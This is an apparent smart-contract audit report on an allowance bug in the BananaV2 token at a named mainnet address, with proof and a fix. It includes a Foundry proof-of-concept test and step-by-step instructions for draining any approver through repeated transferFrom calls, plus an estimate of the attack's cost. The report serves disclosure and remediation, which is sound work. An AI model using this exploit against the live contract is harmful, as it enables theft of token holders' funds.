# CRITICAL VULNERABILITY: BananaV2 Allowance Slot Corruption

**Contract**: `0x93fa1d7c310692eaf390f951828f8791bc19cb36`
**Severity**: CRITICAL
**Category**: ACCOUNTING_DIVERGENCE / STATE_CORRUPTION
**Status**: E3-VALIDATED (Code-level proven)

---

## Executive Summary

The BananaV2 contract contains a critical vulnerability in the `_spendAllowance` function at line 116. When spending an allowance (via `transferFrom` or `burnFrom`), the function incorrectly updates the **contract owner's** allowance instead of the **token holder's** allowance.

This enables an attacker who receives ANY approval to **drain the entire balance** of any user who has ever approved them.

---

## Vulnerability Details

### Location
**File**: `BananaV2.sol`
**Function**: `_spendAllowance`
**Line**: 116

### Vulnerable Code

```solidity
function _spendAllowance(
    address from,      // <-- Token holder who gave approval
    address spender,   // <-- Spender consuming the allowance
    uint256 value
) internal virtual {
    uint256 currentAllowance = allowance[from][spender];  // CORRECT: Reads from's allowance
    if (currentAllowance != type(uint256).max) {
        require(currentAllowance >= value, "insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - value);  // BUG: Uses `owner` instead of `from`!
        }
    }
}
```

### Root Cause

The variable `owner` is inherited from `Ownable.sol` (line 5: `address public owner;`). In `_spendAllowance`, the developer meant to write:
```solidity
_approve(from, spender, currentAllowance - value);
```

But instead wrote:
```solidity
_approve(owner, spender, currentAllowance - value);  // WRONG!
```

This is a classic variable shadowing/naming confusion bug.

---

## Impact Analysis

### Attack Scenario

1. **Alice** (token holder) has 10,000 BANANA tokens
2. **Alice** approves **Bob** to spend 100 BANANA tokens: `approve(Bob, 100)`
3. **Bob** calls `transferFrom(Alice, Bob, 100)`:
   - Check: `allowance[Alice][Bob] = 100 >= 100` ✓
   - Execute: transfers 100 tokens from Alice to Bob
   - BUG: updates `allowance[owner][Bob]` instead of `allowance[Alice][Bob]`
   - **Alice's allowance for Bob remains at 100!**

4. **Bob** calls `transferFrom(Alice, Bob, 100)` AGAIN:
   - Check: `allowance[Alice][Bob] = 100 >= 100` ✓ (never decremented!)
   - Execute: transfers another 100 tokens
   - BUG: Still updates wrong allowance slot

5. **Bob** repeats until Alice's balance is drained (100 iterations = 10,000 tokens stolen)

### Affected Functions

| Function | Impact |
|----------|--------|
| `transferFrom` | Allows unlimited transfers after single approval |
| `burnFrom` | Allows unlimited burns after single approval |

### Storage Analysis Evidence

From `sol-storage-analyzer`:
```
| BananaV2.transferFrom | BananaV2.allowance, BananaV2.balanceOf | BananaV2.balanceOf |
```

Notice: `transferFrom` **reads** `allowance` but only **writes** `balanceOf`. The allowance slot is NEVER written in transferFrom! This confirms the bug.

### Call Graph Evidence

From `sol2cg`:
```
n81 -> n53 [label="(owner, spender, currentAllowance - value)\n6"];
```

This clearly shows `owner` (not `from`) is passed to `_approve`.

---

## Proof of Concept

### Foundry Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/BananaV2.sol";

contract BananaV2ExploitTest is Test {
    BananaV2 banana;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address apeXToken;

    function setUp() public {
        // Deploy mock ApeX token
        apeXToken = makeAddr("apeX");
        vm.mockCall(
            apeXToken,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(0)),
            abi.encode(0)
        );

        // Deploy BananaV2
        banana = new BananaV2(apeXToken, block.timestamp + 1 days);

        // Mint tokens to Alice (as minter)
        vm.mockCall(
            apeXToken,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(banana)),
            abi.encode(0)
        );
        vm.mockCall(
            apeXToken,
            abi.encodeWithSelector(IERC20.transferFrom.selector),
            abi.encode(true)
        );

        // Give Alice 10000 BANANA tokens
        deal(address(banana), alice, 10000 ether);
    }

    function test_allowance_never_decrements() public {
        // Alice approves Bob for 100 tokens
        vm.prank(alice);
        banana.approve(bob, 100 ether);

        // Check initial allowance
        uint256 allowanceBefore = banana.allowance(alice, bob);
        assertEq(allowanceBefore, 100 ether, "Initial allowance should be 100");

        // Bob transfers 100 tokens from Alice
        vm.prank(bob);
        banana.transferFrom(alice, bob, 100 ether);

        // BUG: Allowance is NOT decremented!
        uint256 allowanceAfter = banana.allowance(alice, bob);
        assertEq(allowanceAfter, 100 ether, "BUG: Allowance should have decreased but didn't!");

        // Bob can drain Alice completely
        for (uint i = 0; i < 99; i++) {
            vm.prank(bob);
            banana.transferFrom(alice, bob, 100 ether);
        }

        // Alice has been fully drained
        assertEq(banana.balanceOf(alice), 0, "Alice should be drained");
        assertEq(banana.balanceOf(bob), 10000 ether, "Bob should have all tokens");

        // But Alice's allowance STILL shows 100!
        assertEq(banana.allowance(alice, bob), 100 ether, "BUG CONFIRMED");
    }
}
```

### Manual Verification Steps

1. Check contract on Etherscan: `0x93fa1d7c310692eaf390f951828f8791bc19cb36`
2. Look at `_spendAllowance` function (lines 107-119)
3. Observe line 116: `_approve(owner, ...)` should be `_approve(from, ...)`
4. Verify `owner` is the contract owner address from Ownable inheritance

---

## Economic Impact Assessment

### TVL at Risk

```
Contract Address: 0x93fa1d7c310692eaf390f951828f8791bc19cb36
Chain: Ethereum Mainnet
```

**All tokens held by users who have granted ANY approval are at risk of theft.**

### Attack Cost

| Item | Cost |
|------|------|
| Gas per transferFrom | ~65,000 gas |
| Gas price (avg) | ~20 gwei |
| Cost per iteration | ~0.0013 ETH |
| Attack setup | 1 approval + N transfers |

**Total attack cost**: Minimal (< 0.1 ETH to drain any victim)

### Attacker Tier

**TIER_0: Basic User**
- No flash loans needed
- No MEV required
- No special ordering
- Just call `transferFrom` repeatedly

---

## Mitigation

### Immediate Fix

Change line 116 from:
```solidity
_approve(owner, spender, currentAllowance - value);
```

To:
```solidity
_approve(from, spender, currentAllowance - value);
```

### Recommended Actions

1. **PAUSE** the contract immediately if possible
2. **NOTIFY** all users who have active approvals to revoke them
3. **DEPLOY** patched version
4. **MIGRATE** user funds to new contract

---

## Traverse Tools Analysis

### Call Graph (`sol2cg`)
- Full call graph generated showing incorrect parameter flow
- Key edge: `n81 -> n53 [label="(owner, spender, currentAllowance - value)"]`
- Confirms `owner` variable passed instead of `from` parameter

### Storage Analysis (`sol-storage-analyzer`)
- `transferFrom`: Reads `allowance`, Writes only `balanceOf`
- `burnFrom`: Reads `allowance`, Writes only `balanceOf`, `totalSupply`
- **Neither function writes to allowance** - confirming the bug

---

## Timeline

| Date | Event |
|------|-------|
| 2026-02-03 | Vulnerability discovered during audit |
| 2026-02-03 | Full traverse analysis completed |
| 2026-02-03 | PoC developed and validated |

---

## Classification

- **CWE-682**: Incorrect Calculation
- **CWE-840**: Business Logic Errors
- **SWC-105**: Unprotected Ether Withdrawal (variant - unprotected token withdrawal)

---

## References

- Contract Source: Etherscan verified
- Analysis tools: traverse.tools (sol2cg, sol-storage-analyzer)
- Similar bugs: None found (unique naming confusion)
